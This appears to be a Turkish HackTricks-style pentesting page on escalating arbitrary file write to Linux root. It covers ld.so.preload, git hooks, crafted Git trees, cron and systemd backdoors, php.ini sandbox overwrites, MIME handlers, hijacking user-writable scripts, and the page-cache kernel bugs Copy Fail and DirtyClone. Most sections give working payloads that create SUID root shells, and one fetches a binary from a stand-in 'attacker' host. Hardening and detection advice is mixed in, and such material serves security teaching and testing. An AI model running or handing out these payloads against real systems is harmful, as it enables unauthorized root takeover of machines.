# Root'a Keyfi Dosya Yazma

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload`, dynamic linker'ın diğer shared object'lerden önce yüklediği shared object'lerin sistem genelindeki listesidir. Secure-execution mode, preloading için ek kısıtlamalar uygular; bu nedenle `/tmp/pe.so` gibi bir library path'i evrensel bir SUID-binary tekniği değildir.\
Bu dosyayı oluşturabilir veya değiştirebilirseniz, dosyayı yükleyen bir process, listelenen library'yi diğer shared object'lerinden önce yükler ve bu process'in context'i içinde code execution sağlar.<sup>[[12]](#references)</sup>

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks**, bir repository'deki commit ve merge işlemleri dahil olmak üzere olaylar için çalıştırılan executable script'lerdir. Bir **privileged script veya user** bu işlemleri gerçekleştiriyorsa ve bir attacker **`.git` klasörüne yazabiliyorsa**, hook **privilege escalation** için kullanılabilir.<sup>[[13]](#references)</sup>

Örneğin, yeni bir commit oluşturulduğunda her zaman çalıştırılması için bir git repo'sunda **`.git/hooks`** altında bir **script oluşturmak** mümkündür:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Privileged Git tree export path traversal

Ayrıcalıklı bir synchronizer checkout işleminden kaçınabilir; bunun yerine saldırganın etkilediği repository'yi `git ls-tree` ile enumerate edebilir, her blob'u `git cat-file` ile okuyabilir, bildirilen pathname'i bir staging directory ile birleştirebilir ve dosyayı kendisi yazabilir. `-c safe.directory=*` (Git'in farklı owner'a sahip repository korumasını devre dışı bırakır) seçeneğini destination containment check olmadan birleştirdiğinde bu durum **synchronizer'ın ayrıcalıklarıyla arbitrary file write** işlemine dönüşür. Absolute bir tree-entry name, Python'daki `os.path.join(stage, name)` çağrısının `stage` değerini yok saymasına neden olur; `../` içeren relative bir name ise filesystem bunu çözümlerken dışarı çıkar. Uygulama raw tree'yi Git'ten checkout etmesini istemek yerine kendisi materialize ettiği için checkout-time pathname rejection sink'i hiçbir zaman korumaz.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Root services, timers, deployment agents, template importers ve backup/restore jobs içinde şu code yapısını arayın:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Bir tree girdisi `<mode> SP <name> NUL <raw object ID>` olarak kodlanır. `git hash-object --literally` seçeneği, normal ayrıştırmanın veya `git fsck` komutunun reddedebileceği object verilerine kasıtlı olarak izin verir; bu nedenle disposable bir clone, dosya adı mutlak bir hedef olan bir tree oluşturabilir. Bu örnek bir cron-file blob'u oluşturur, hazırlanmış tree'yi bir commit içine sarar ve bir branch'i buna taşır; exploitation için hâlâ ayrıcalıklı job tarafından kullanılan bir repository'yi güncelleme izni ve malformed object'i kabul eden bir Git server gerekir.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Hardening hem repository ingestion işlemini hem de son filesystem operasyonunu kapsamalıdır:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*` değerini service'in güvenmesi gereken tam repositories ile değiştirin ve mümkün olduğunda repository processing işlemini root privileges olmadan çalıştırın.
- Materialization işleminden önce absolute names ile herhangi bir `.` veya `..` component'ini reddedin. Birleştirme işleminden sonra canonicalize edin ve destination'ın hedeflenen root altında kaldığını doğrulayın.
- Check-then-open symlink race'lerinden kaçının: trusted directory descriptor'a göre relative olarak açın ve Linux'ta attacker-controlled paths için `RESOLVE_BENEATH` ile birlikte `RESOLVE_NO_SYMLINKS` kullanan `openat2()` fonksiyonunu kullanın.
- Plumbing output'tan checkout işlemini yeniden uygulamak yerine izole bir directory içinde normal bir checkout işlemini tercih edin. Raw-object ingestion gerekiyorsa `receive.fsckObjects=true` gibi receive-side validation seçeneklerini etkinleştirin; crafted trees'i reddetmek için gereken pathname-related `receive.fsck.*` bulgularını downgrade etmeyin.

### Cron ve Time dosyaları

**Root'un çalıştırdığı cron-related dosyaları yazabiliyorsanız**, genellikle job bir sonraki çalıştırıldığında code execution elde edebilirsiniz. İlginç hedefler şunlardır:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` veya `/var/spool/cron/crontabs/` içindeki Root'un kendi crontab'ı
- `systemd` timers ve bunların tetiklediği services

Hızlı kontroller:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipik kötüye kullanım yolları:

- `/etc/crontab` dosyasına veya `/etc/cron.d/` içindeki bir dosyaya **yeni bir root cron job eklemek**
- `run-parts` tarafından zaten çalıştırılan bir **script'i değiştirmek**
- Script'i veya başlattığı binary'yi değiştirerek **mevcut bir timer hedefini backdoor'lamak**

Minimal cron payload örneği:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
`run-parts` tarafından kullanılan bir cron dizinine yalnızca yazabiliyorsanız, bunun yerine oraya çalıştırılabilir bir dosya bırakın:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notlar:

- `run-parts` genellikle nokta içeren dosya adlarını yok sayar; bu nedenle `backup.sh` yerine `backup` gibi adları tercih edin.<sup>[[15]](#references)</sup>
- Bazı sistemler klasik cron yerine `systemd` timer'larını kullanır, ancak abuse fikri aynıdır: **root'un daha sonra çalıştıracağı şeyi değiştirmek**.<sup>[[20]](#references)</sup>

### Service & Socket dosyaları

**`systemd` unit dosyalarına** veya bunların referans verdiği dosyalara yazabiliyorsanız, unit'i reload edip restart ederek ya da service/socket activation yolunun tetiklenmesini bekleyerek root olarak code execution elde edebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

İlginç hedefler:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` içindeki drop-in override'lar
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` tarafından referans verilen service script'leri/binary'leri
- Root service tarafından yüklenen, yazılabilir `EnvironmentFile=` path'leri

Hızlı kontroller:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Yaygın abuse yolları:

- Değiştirebildiğiniz root-owned bir service unit içindeki **`ExecStart=`** değerinin üzerine yazmak
- Kötü amaçlı bir **`ExecStart=`** içeren bir drop-in override eklemek ve önce eski değeri temizlemek
- Unit tarafından zaten referans verilen script/binary dosyasına **backdoor** eklemek
- Socket bir bağlantı aldığında başlayan ilgili **`.service`** dosyasını değiştirerek socket-activated bir service'i **hijack** etmek

Kötü amaçlı override örneği:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipik etkinleştirme akışı:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Kendiniz service restart edemiyor ancak socket-activated unit'i düzenleyebiliyorsanız, backdoored service'ın root olarak çalıştırılmasını tetiklemek için yalnızca **bir client connection beklemeniz** gerekebilir.<sup>[[17]](#references)</sup>

### Privileged PHP sandbox tarafından kullanılan kısıtlayıcı bir `php.ini` dosyasının üzerine yazma

Bazı özel daemon'lar, kullanıcı tarafından sağlanan PHP kodunu **kısıtlı bir `php.ini`** ile `php` çalıştırarak doğrular (örneğin, `disable_functions=exec,system,...`). Sandbox içindeki kod hâlâ **herhangi bir write primitive**'e (örneğin `file_put_contents`) sahipse ve daemon tarafından kullanılan **tam `php.ini` path'ine** erişebiliyorsanız, kısıtlamaları kaldırmak için bu config'in **üzerine yazabilir**, ardından elevated privileges ile çalışan ikinci bir payload gönderebilirsiniz.<sup>[[2]](#references)</sup>

Tipik akış:

1. İlk payload sandbox config'in üzerine yazar.
2. Tehlikeli function'lar yeniden etkinleştirildikten sonra ikinci payload code çalıştırır.

Minimal örnek (daemon tarafından kullanılan path'i değiştirin):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Daemon root olarak çalışıyorsa (veya root sahipli path'lerle doğrulama yapıyorsa), ikinci çalıştırma root context'i sağlar. Bu, sandbox'lı runtime hâlâ dosya yazabiliyorsa, temelde **config overwrite üzerinden privilege escalation** anlamına gelir.

### binfmt_misc

`binfmt_misc`, kayıtları `/proc/sys/fs/binfmt_misc` altında sunar; her kayıt bir file-type pattern'ini bir interpreter ile ilişkilendirir. Privilege etkisi, kaydı kimin değiştirebildiğine ve eşleşen dosyayı daha sonra hangi process'in çalıştırdığına bağlıdır; bu nedenle bunu bir privilege-escalation yolu olarak değerlendirmeden önce bu gereksinimleri doğrulayın.<sup>[[21]](#references)</sup>

### Şema handler'larını overwrite etme (http: veya https: gibi)

Desktop environment'lar, URI scheme'leri için bir application seçmek amacıyla MIME association'larını ve desktop entry'lerini kullanır; ilgili per-user config ve desktop-entry directory'lerine yazabilen bir attacker, bu scheme'leri kontrol ettiği bir launcher'a yönlendirebilir. `$HOME/.config/mimeapps.list` dosyasını HTTP ve HTTPS URL handler'larını malicious bir file'a yönlendirecek şekilde değiştirerek (örneğin, `x-scheme-handler/http=evil.desktop` ve `x-scheme-handler/https=evil.desktop`), bir user click'i bu desktop entry'yi invoke edebilir.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root tarafından kullanıcı tarafından yazılabilir script/binary dosyalarının çalıştırılması

Ayrıcalıklı bir workflow `/bin/sh /home/username/.../script` gibi bir şey çalıştırıyorsa (veya ayrıcalıksız bir kullanıcıya ait bir dizinin içindeki herhangi bir binary'yi), bunu ele geçirebilirsiniz:<sup>[[1]](#references)</sup>

- **Çalıştırmayı tespit edin:** Root'un kullanıcı tarafından kontrol edilen path'leri çağırdığını yakalamak için süreçleri pspy ile izleyin.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Yazılabilirliği doğrula:** hem hedef dosyanın hem de dizininizin sahibi olduğundan ve kullanıcı hesabınız tarafından yazılabilir olduğundan emin olun.
- **Hedefi ele geçir:** orijinal binary/script dosyasını yedekleyin ve SUID shell oluşturan (veya başka bir root action gerçekleştiren) bir payload bırakın, ardından izinleri geri yükleyin:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Ayrıcalıklı eylemi tetikleyin** (ör. helper'ı oluşturan bir UI düğmesine basarak). Root, ele geçirilmiş yolu yeniden çalıştırdığında `./rootshell -p` ile yükseltilmiş shell'i alın.

### Ayrıcalıklı binary'lerde yalnızca page-cache dosya değişikliği

Bazı kernel bug'ları dosyayı **disk üzerinde değiştirmez**. Bunun yerine yalnızca okunabilir bir dosyanın **page cache kopyasını** değiştirmenize olanak tanır. Bir **setuid** veya başka şekilde **root tarafından çalıştırılan** binary'yi hedefleyebilirseniz, sonraki çalıştırma diskteki dosya hash'i değişmemiş olsa bile memory'deki saldırgan kontrollü byte'ları çalıştırabilir ve ayrıcalıkları yükseltebilir.<sup>[[3]](#references)[[4]](#references)</sup>

Bunu bir **yalnızca runtime'da geçerli dosya yazma primitive'i** olarak düşünmek faydalıdır:<sup>[[3]](#references)</sup>

- **Disk temiz kalır**: inode ve diskteki byte'lar değişmez
- **Memory dirty durumdadır**: cache'lenmiş sayfayı okuyan/çalıştıran process'ler saldırgan tarafından değiştirilmiş içeriği alır
- **Etki geçicidir**: değişiklik reboot veya cache eviction sonrasında kaybolur

Bu primitive, klasik **arbitrary file write** ile Dirty COW / Dirty Pipe gibi eski **page-cache abuse** bug'ları arasında yer alır:<sup>[[3]](#references)</sup>

- Dirty COW bir race condition'a dayanıyordu
- Dirty Pipe'ın write-position kısıtlamaları vardı
- Page-cache-only primitive, vulnerable path cache'lenmiş file-backed page'lere doğrudan write sağlıyorsa daha güvenilir olabilir

#### Generic privesc flow

1. **File-backed page cache page'lerine** write yapabilen bir kernel primitive'i elde edin
2. Bunu **okunabilir ayrıcalıklı bir binary** veya root tarafından çalıştırılan başka bir dosya üzerinde kullanın
3. Page cache'den eviction gerçekleşmeden **execution'ı tetikleyin**
4. Diskteki dosya hâlâ değiştirilmemiş görünürken root olarak code execution elde edin

Tipik yüksek değerli hedefler:

- **setuid-root** binary'leri
- **Root service'leri** tarafından başlatılan helper'lar
- **Host kernel/page cache'i paylaşan container'lar** içinden yaygın olarak çalıştırılan binary'ler

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) bu sınıfa iyi bir örnektir. Vulnerable path, Linux crypto userspace API'si (`AF_ALG` / `algif_aead`) içindeydi:<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`, page cache page'lerine ait referansları okunabilir bir dosyadan crypto TX scatterlist'ine taşıyabilir
- in-place `algif_aead` decrypt path'i source ve destination buffer'larını yeniden kullandı
- `authencesn` daha sonra destination tag region'ına write yaptı
- Bu region hâlâ spliced file-backed page'lere referans veriyorsa write, hedef dosyanın **page cache'ine** yapıldı

Dolayısıyla ilgi çekici teknik CVE'nin kendisi değil, şu pattern'dir:

- **File-backed cache page'lerini bir kernel subsystem'ine aktarın**
- Subsystem'in bunları **writable output** olarak ele almasını sağlayın
- Memory'de küçük ve kontrollü bir overwrite tetikleyin

Public PoC, memory'de `/usr/bin/su` dosyasını patch'lemek ve ardından çalıştırmak için tekrarlanan **4-byte write** işlemleri kullandı.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503), bu kez sink olarak `AF_ALG` yerine **IPsec ESP decrypt** kullanarak aynı **page-cache-only write-to-root** pattern'inin başka bir varyantını gösterir.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Buradaki önemli teknik **metadata-laundering adımıdır**:

- `splice()`, **read-only file-backed page-cache page'ini** bir ESP-in-UDP packet'ine yerleştirir
- Orijinal DirtyFrag mitigation'ı, `esp_input()` decrypt işleminden önce **copy** yapabilsin diye skb'yi `SKBFL_SHARED_FRAG` ile işaretledi
- netfilter `TEE`, packet'i `nf_dup_ipv4()` -> `__pskb_copy_fclone()` üzerinden çoğaltır
- Clone, **aynı physical page-cache referansını** korur ancak `SKBFL_SHARED_FRAG` değerini kaybeder
- `esp_input()` daha sonra clone'u güvenli kabul eder ve file-backed page üzerinde **in-place `cbc(aes)` decrypt** çalıştırır

Dolayısıyla reviewer dersi CVE'den daha geneldir: Bir mitigation, bir işlemin önce copy yapması gerekip gerekmediğine karar vermek için **skb/page metadata**'sına dayanıyorsa, backing page'i koruyup metadata'yı kaldıran herhangi bir **clone/copy path**, write primitive'ini sessizce yeniden etkinleştirebilir.

Tipik exploitation flow:

1. **Private network namespace içinde `CAP_NET_ADMIN`** elde etmek için `unshare(CLONE_NEWUSER | CLONE_NEWNET)` kullanın
2. Loopback'i etkinleştirin ve `mangle/OUTPUT` içine bir **netfilter `TEE` rule** yükleyin
3. `NETLINK_XFRM` üzerinden **XFRM ESP transport SA**'ları yükleyin
4. Her hedef 4-byte word'ü SA `seq_hi` field'ında encode edin (DirtyFrag'in word-selection trick'i)
5. Spliced ESP-in-UDP packet'ini gönderin; böylece **TEE clone** `esp_input()`'e ulaşır ve **in place** decrypt işlemi yapar
6. `/usr/bin/su` veya başka bir privileged executable'ın page-cache kopyası saldırgan kontrollü code içerecek hâle gelene kadar tekrarlayın

Operational olarak etki `AF_ALG` example'ındakiyle aynıdır: Diskteki dosya temiz kalır, ancak `execve()` **değiştirilmiş page-cache byte'larını** kullanır ve root elde edilir.<sup>[[8]](#references)[[9]](#references)</sup>

Bu varyant için faydalı exposure check'leri:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Kısa vadeli attack-surface reduction burada path-specific'tir: `48f6a5356a33` taşıyan bir kernel'e yükseltmek clone path'ini düzeltirken, `xt_TEE` autoload'unu engellemek **flag-laundering step**'ini ortadan kaldırır ve `esp4` / `esp6`'yı engellemek **decrypt sink**'i ortadan kaldırır.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure ve hunting

Bu bug sınıfından şüpheleniyorsanız yalnızca disk bütünlüğü kontrollerine güvenmeyin. Ayrıca şunları doğrulayın:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Aşağıdaki yapılandırma değerleri, yüklenebilir bir interface ile kernel içine yerleşik olanı birbirinden ayırır; crypto build kuralları `CONFIG_CRYPTO_USER_API_AEAD` değerini `algif_aead` ile eşler.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` bir module olarak yüklenebilir/kaldırılabilir
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface kernel içine yerleşiktir
- setuid binaries iyi hedeflerdir; çünkü yalnızca page-cache kullanan bir patch, local foothold'u root'a dönüştürmek için yeterli olabilir

#### `algif_aead` path'i için attack-surface reduction

Vulnerable interface loadable bir module tarafından sağlanıyorsa:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Kernel'e derlenmişse, bazı disclosure'lar init path'ini şu şekilde engellediğini bildirmiştir:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Bu tür bir mitigation, diğer kernel LPE'leri için de hatırlanmaya değerdir: exploitation belirli bir optional interface'e bağlıysa, bu interface'i devre dışı bırakmak veya blacklist'e almak, tam bir kernel upgrade'i kullanılabilir olmadan önce bile exploit yolunu kesebilir.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – user-writable bir PaperCut directory'sinde root tarafından çalıştırılan bir script'in hijack edilmesi](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 için Openwall oss-security disclosure'ı](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - out-of-place çalışmaya geri dön](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory'si](https://copy.fail/)
- [7] [Theori / Xint teknik writeup'ı](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE variant'ı DirtyClone'u (CVE-2026-43503) inceleme ve exploit etme](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: `__pskb_copy_fclone()` içinde `SKBFL_SHARED_FRAG` değerini koru (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux için önceki mitigation: spliced UDP packet'ları için `SKBFL_SHARED_FRAG` ayarla (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` documentation](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` documentation](https://git-scm.com/docs/git-ls-tree)
- [33] [Git configuration documentation](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
{{#include ../../banners/hacktricks-training.md}}
